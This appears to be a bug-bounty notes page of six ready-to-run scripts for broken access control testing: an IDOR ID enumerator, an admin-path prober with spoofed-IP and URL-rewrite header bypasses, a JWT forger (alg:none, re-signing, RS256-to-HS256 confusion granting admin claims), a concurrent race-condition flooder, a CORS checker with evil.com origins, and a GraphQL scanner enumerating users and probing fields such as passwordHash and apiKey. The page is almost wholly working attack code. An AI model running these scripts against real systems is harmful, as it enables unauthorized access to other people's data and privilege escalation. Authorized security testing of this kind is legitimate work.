---
tags: [bac, tools, scripts, python, automation]
type: tools
date: 2026-03-10
---

# 🐍 Custom Scripts — BAC Automation (v2)

> All scripts are production-ready with rate limiting, proper error handling, and output that maps directly to evidence for reports.

---

## Script 1: Rate-Limited IDOR Scanner (Safe for Programs)

```python
#!/usr/bin/env python3
"""
IDOR Scanner v2 — Rate-limited, adaptive, evidence-generating
Respects program rules with configurable delay between requests.

Usage: python3 idor_scan.py
"""
import requests, json, time, csv, sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock

try:
    from colorama import Fore, Style, init; init()
    RED, YEL, GRN, RST = Fore.RED, Fore.YELLOW, Fore.GREEN, Style.RESET_ALL
except ImportError:
    RED = YEL = GRN = RST = ""

# ─── CONFIG ─────────────────────────────────────────────────────────────
TARGET    = "https://target.com/api/orders/{id}"
TOKEN     = "Bearer YOUR_JWT_OR_COOKIE"
MY_IDS    = {1001, 1002, 1003}         # Your own IDs — used as baseline
SCAN_FROM = 1000
SCAN_TO   = 5000
THREADS   = 5                           # Keep low (5-10) to avoid 429s
DELAY     = 0.3                         # Seconds between requests per thread
BASELINE_SIZE = None                    # Auto-detected from your own IDs
OUTPUT_CSV = "idor_findings.csv"
# ────────────────────────────────────────────────────────────────────────

lock  = Lock()
found = []

session = requests.Session()
session.headers.update({
    "Authorization": TOKEN,
    "User-Agent": "Mozilla/5.0 (Security Research)",
    "Accept": "application/json",
})

def get_baseline():
    """Establish what a valid response looks like (your own resources)."""
    global BASELINE_SIZE
    sizes = []
    for mid in list(MY_IDS)[:3]:
        try:
            r = session.get(TARGET.format(id=mid), timeout=10)
            if r.status_code == 200:
                sizes.append(len(r.text))
        except Exception:
            pass
    BASELINE_SIZE = int(sum(sizes) / len(sizes)) if sizes else 200
    print(f"[*] Baseline response size (your own IDs): ~{BASELINE_SIZE} bytes")

def classify_response(id_val, r):
    """Classify a response as IDOR / possible / not interesting."""
    if r.status_code != 200:
        return None
    if id_val in MY_IDS:
        return None  # skip your own

    # Must have substantial content
    if len(r.text) < 50:
        return None

    try:
        data = r.json()
    except Exception:
        # Non-JSON 200 — flag if large enough
        if len(r.text) > 200:
            return "possible"
        return None

    # Strong indicators of real data
    pii_keys = {"email","phone","address","ssn","dob","card","password",
                "token","secret","key","name","user","account","billing"}
    if any(k in str(data).lower() for k in pii_keys):
        return "idor"

    # Structural check: non-trivial object
    if isinstance(data, dict) and len(data) > 2:
        return "idor"
    if isinstance(data, list) and len(data) > 0:
        return "idor"

    return "possible"

def test_id(id_val):
    time.sleep(DELAY)
    url = TARGET.format(id=id_val)
    try:
        r = session.get(url, timeout=12)
        verdict = classify_response(id_val, r)
        if verdict:
            entry = {
                "id": id_val, "url": url,
                "status": r.status_code,
                "size": len(r.text),
                "verdict": verdict,
                "snippet": r.text[:300].replace("\n", " ")
            }
            with lock:
                found.append(entry)
                color = RED if verdict == "idor" else YEL
                print(f"{color}[{verdict.upper()}] ID={id_val} | "
                      f"{r.status_code} | {len(r.text)}b{RST}")
                if verdict == "idor":
                    try:
                        print(f"  ↳ {json.dumps(r.json(), indent=2)[:400]}\n")
                    except Exception:
                        print(f"  ↳ {r.text[:200]}\n")
    except requests.exceptions.RequestException:
        pass

def save_csv():
    if not found: return
    with open(OUTPUT_CSV, "w", newline="") as f:
        w = csv.DictWriter(f, fieldnames=found[0].keys())
        w.writeheader(); w.writerows(found)
    print(f"\n{GRN}[+] {len(found)} findings saved to {OUTPUT_CSV}{RST}")

if __name__ == "__main__":
    print(f"[*] IDOR Scanner v2 | Target: {TARGET}")
    print(f"[*] Range: {SCAN_FROM}–{SCAN_TO} | {THREADS} threads | {DELAY}s delay")
    get_baseline()

    ids = [i for i in range(SCAN_FROM, SCAN_TO + 1) if i not in MY_IDS]
    with ThreadPoolExecutor(max_workers=THREADS) as ex:
        futures = {ex.submit(test_id, i): i for i in ids}
        try:
            for _ in as_completed(futures): pass
        except KeyboardInterrupt:
            print("\n[!] Interrupted — saving partial results...")

    print(f"\n[*] Scan complete. {RED}{len([x for x in found if x['verdict']=='idor'])} IDOR{RST}, "
          f"{YEL}{len([x for x in found if x['verdict']=='possible'])} POSSIBLE{RST}")
    save_csv()
```

---

## Script 2: Admin Endpoint Prober with Full Bypass Matrix

```python
#!/usr/bin/env python3
"""
Admin Prober v2 — Tests endpoints + all bypass techniques simultaneously
"""
import requests, sys
from itertools import product

TARGET = "https://target.com"
TOKEN  = "YOUR_LOW_PRIV_TOKEN"  # as cookie value or Bearer token
USE_COOKIE = True               # True = Cookie header, False = Authorization Bearer

ADMIN_PATHS = [
    "/admin", "/admin/users", "/admin/config", "/admin/logs",
    "/admin/export", "/admin/audit", "/admin/delete",
    "/api/admin", "/api/v1/admin", "/api/v1/admin/users",
    "/api/v2/admin", "/api/internal", "/api/internal/users",
    "/management", "/management/users", "/internal/admin",
    "/superuser", "/staff", "/moderator", "/ops",
    "/api/admin/audit-logs", "/api/admin/impersonate",
    "/api/system/config", "/api/platform/admin",
]

BYPASS_HEADERS = [
    {},
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"X-Remote-Addr": "127.0.0.1"},
    {"X-Forwarded-Host": "localhost"},
    {"X-Original-URL": None},   # set dynamically
    {"X-Rewrite-URL": None},
]

def make_session():
    s = requests.Session()
    s.headers.update({"User-Agent": "Mozilla/5.0"})
    if USE_COOKIE:
        s.cookies.set("session", TOKEN)
    else:
        s.headers.update({"Authorization": f"Bearer {TOKEN}"})
    return s

session = make_session()
print(f"[*] Testing {len(ADMIN_PATHS)} paths × {len(BYPASS_HEADERS)} header combos\n")

for path in ADMIN_PATHS:
    for hdrs in BYPASS_HEADERS:
        h = dict(hdrs)
        if "X-Original-URL" in h: h["X-Original-URL"] = path
        if "X-Rewrite-URL"  in h: h["X-Rewrite-URL"]  = path
        try:
            r = session.get(f"{TARGET}{path}", headers=h,
                            timeout=8, allow_redirects=False)
            if r.status_code not in {400, 401, 403, 404, 429, 500, 301, 302}:
                hdr_note = ", ".join(f"{k}:{v}" for k,v in h.items()) or "baseline"
                print(f"[!] {r.status_code} | {path} | {hdr_note} | {len(r.text)}b")
        except Exception:
            pass
```

---

## Script 3: JWT Full Attack Suite

```python
#!/usr/bin/env python3
"""
JWT Attack Suite — alg:none + payload tampering + RS256→HS256
"""
import base64, json, hmac, hashlib, sys

def b64_decode(s):
    s += "=" * (4 - len(s) % 4)
    return base64.urlsafe_b64decode(s)

def b64_encode(b):
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

def decode_token(token):
    parts = token.split(".")
    header  = json.loads(b64_decode(parts[0]))
    payload = json.loads(b64_decode(parts[1]))
    return header, payload, parts[2]

def attack_none(token, mods=None):
    """Attack 1: Set alg to none, remove signature."""
    h, p, _ = decode_token(token)
    h["alg"] = "none"
    if mods: p.update(mods)
    new_h = b64_encode(json.dumps(h, separators=(",",":")).encode())
    new_p = b64_encode(json.dumps(p, separators=(",",":")).encode())
    result = f"{new_h}.{new_p}."
    print(f"\n[alg:none]\n{result}")
    return result

def attack_hs256(token, secret, mods=None):
    """Attack 2: Re-sign with HMAC secret (use after cracking or for RS256→HS256)."""
    h, p, _ = decode_token(token)
    h["alg"] = "HS256"
    if mods: p.update(mods)
    new_h = b64_encode(json.dumps(h, separators=(",",":")).encode())
    new_p = b64_encode(json.dumps(p, separators=(",",":")).encode())
    sig_input = f"{new_h}.{new_p}".encode()
    if isinstance(secret, str): secret = secret.encode()
    sig = b64_encode(hmac.new(secret, sig_input, hashlib.sha256).digest())
    result = f"{new_h}.{new_p}.{sig}"
    print(f"\n[HS256 re-signed]\n{result}")
    return result

def attack_rs256_to_hs256(token, public_key_pem, mods=None):
    """Attack 3: RS256→HS256 confusion — sign with public key as HMAC secret."""
    print("[*] RS256→HS256: signing with public key as HMAC secret")
    return attack_hs256(token, public_key_pem, mods)

def show_claims(token):
    """Decode and display all claims."""
    h, p, sig = decode_token(token)
    print(f"Header:  {json.dumps(h, indent=2)}")
    print(f"Payload: {json.dumps(p, indent=2)}")
    print(f"Sig:     {sig[:20]}...")

# ─── USAGE ────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    TOKEN = "YOUR.JWT.TOKEN"
    MODIFICATIONS = {
        "role": "admin",
        "is_admin": True,
        "scope": "admin:all"
    }

    print("=== JWT Attack Suite ===\n")
    show_claims(TOKEN)

    # Attack 1: alg none
    attack_none(TOKEN, MODIFICATIONS)

    # Attack 2: re-sign with known secret
    # attack_hs256(TOKEN, "mysecret", MODIFICATIONS)

    # Attack 3: RS256→HS256 (paste PEM public key)
    # pubkey = open("pubkey.pem").read()
    # attack_rs256_to_hs256(TOKEN, pubkey, MODIFICATIONS)
```

---

## Script 4: Async Race Condition Tester

```python
#!/usr/bin/env python3
"""
Race Condition Tester — fires N concurrent requests to hit TOCTOU windows.
Use HTTP/2 single-packet mode for maximum timing precision.
"""
import asyncio, aiohttp, time, json

TARGET  = "https://target.com/api/trial/activate"
METHOD  = "POST"
HEADERS = {"Authorization": "Bearer YOUR_TOKEN", "Content-Type": "application/json"}
BODY    = {}          # request body (dict)
THREADS = 50          # number of concurrent requests
TIMEOUT = 15

results = []

async def send(session, i):
    try:
        async with session.request(
            METHOD, TARGET, headers=HEADERS,
            json=BODY, timeout=aiohttp.ClientTimeout(total=TIMEOUT)
        ) as resp:
            body = await resp.text()
            results.append((i, resp.status, len(body), body[:100]))
    except Exception as e:
        results.append((i, "ERR", 0, str(e)))

async def race():
    connector = aiohttp.TCPConnector(limit=THREADS, ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        # Stagger slightly to keep in the same TCP window, then release
        tasks = [send(session, i) for i in range(THREADS)]
        t0 = time.time()
        await asyncio.gather(*tasks)
        elapsed = time.time() - t0

    print(f"\n[*] {THREADS} requests completed in {elapsed:.3f}s\n")
    # Summarize results
    status_counts = {}
    for _, status, size, _ in results:
        status_counts[status] = status_counts.get(status, 0) + 1
    print("[*] Status code distribution:")
    for status, count in sorted(status_counts.items()):
        print(f"    {status}: {count}x")

    # Show interesting responses (non-uniform = race may have worked)
    unique_responses = set(body for _, _, _, body in results)
    if len(unique_responses) > 1:
        print(f"\n[!] {len(unique_responses)} unique responses — possible race condition!")
        for resp in unique_responses:
            print(f"  → {resp}")
    else:
        print("\n[*] All responses identical — likely no race condition here")

asyncio.run(race())
```

---

## Script 5: CORS Bulk Checker

```bash
#!/usr/bin/env bash
# CORS Checker v2 — test multiple origins against multiple endpoints
# Usage: ./cors_check.sh endpoints.txt SESSION_COOKIE

ENDPOINTS_FILE=${1:-endpoints.txt}
COOKIE=${2:-"session=YOUR_TOKEN"}

ORIGINS=(
    "https://evil.com"
    "null"
    "https://TARGET.com.evil.com"
    "https://evilTARGET.com"
    "https://TARGET.com@evil.com"
    "http://localhost"
    "https://localhost"
    "http://127.0.0.1"
)

echo "[*] CORS Bulk Checker"
echo "[*] Testing $(wc -l < "$ENDPOINTS_FILE") endpoints × ${#ORIGINS[@]} origins"
echo "─────────────────────────────────────────────────────────"

while IFS= read -r endpoint; do
    [[ -z "$endpoint" || "$endpoint" == \#* ]] && continue
    for origin in "${ORIGINS[@]}"; do
        response=$(curl -sk \
            -H "Origin: $origin" \
            -H "Cookie: $COOKIE" \
            -I "$endpoint" 2>/dev/null)
        acao=$(echo "$response" | grep -i "^access-control-allow-origin:" | tr -d '\r\n')
        acac=$(echo "$response" | grep -i "^access-control-allow-credentials:" | tr -d '\r\n')

        if [[ -n "$acao" && "$acac" =~ "true" ]]; then
            echo "🔴 VULN  | $endpoint"
            echo "         Origin:  $origin"
            echo "         ACAO:    $acao"
            echo "         ACAC:    $acac"
            echo ""
        fi
    done
done < "$ENDPOINTS_FILE"
echo "[*] Done."
```

---

## Script 6: GraphQL BOLA + Introspection Scanner

```python
#!/usr/bin/env python3
"""
GraphQL Scanner — introspection + BOLA ID enumeration + field-level auth test
"""
import requests, json

TARGET = "https://target.com/graphql"
TOKEN  = "Bearer YOUR_TOKEN"

session = requests.Session()
session.headers.update({
    "Authorization": TOKEN,
    "Content-Type": "application/json"
})

def gql(query):
    r = session.post(TARGET, json={"query": query})
    return r.json()

def run_introspection():
    print("[*] Running introspection...")
    result = gql("{ __schema { types { name kind fields { name } } } }")
    if "errors" in result:
        print(f"[!] Introspection blocked: {result['errors'][0]['message']}")
        # Try Type introspection instead:
        r2 = gql('{ __type(name: "User") { fields { name type { name } } } }')
        if "data" in r2 and r2["data"].get("__type"):
            print("[+] Type introspection works! Fields:")
            for f in r2["data"]["__type"]["fields"]:
                print(f"    {f['name']}: {f['type']['name']}")
        return
    types = result.get("data", {}).get("__schema", {}).get("types", [])
    for t in types:
        if t["kind"] == "OBJECT" and not t["name"].startswith("__"):
            fields = [f["name"] for f in (t.get("fields") or [])]
            if fields:
                print(f"[+] Type: {t['name']} → {', '.join(fields)}")

def test_bola(query_template, id_range=range(1, 200)):
    print(f"\n[*] Testing BOLA on IDs {id_range.start}–{id_range.stop}...")
    for uid in id_range:
        query = query_template.format(id=uid)
        result = gql(query)
        data = result.get("data", {})
        # Extract first non-null value
        for key, val in data.items():
            if val and isinstance(val, dict):
                print(f"[BOLA] id={uid} → {list(val.items())[:3]}")

def test_sensitive_fields(object_query):
    """Test if sensitive fields are over-exposed."""
    sensitive = ["passwordHash","password","apiKey","secret","token",
                 "ssn","dob","creditCard","bankAccount","privateKey"]
    for field in sensitive:
        q = object_query.replace("FIELDS", field)
        result = gql(q)
        if "errors" not in result and result.get("data"):
            print(f"[!] Sensitive field accessible: {field}")

# ─── USAGE ────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    run_introspection()

    # BOLA test — replace with your target's actual query
    BOLA_QUERY = '{{ user(id: {id}) {{ id email name phone }} }}'
    test_bola(BOLA_QUERY, id_range=range(1, 100))

    # Sensitive field test
    FIELD_QUERY = '{{ user(id: "me") {{ FIELDS }} }}'
    test_sensitive_fields(FIELD_QUERY)
```

---

## 🔗 Related Notes
- [[Burp-Suite-BAC]] | [[Nuclei-BAC]] | [[Tools-Arsenal]]
- [[IDOR-Techniques]] | [[Race-Condition-BAC]]

---
*Tags: #scripts #automation #python #bac*
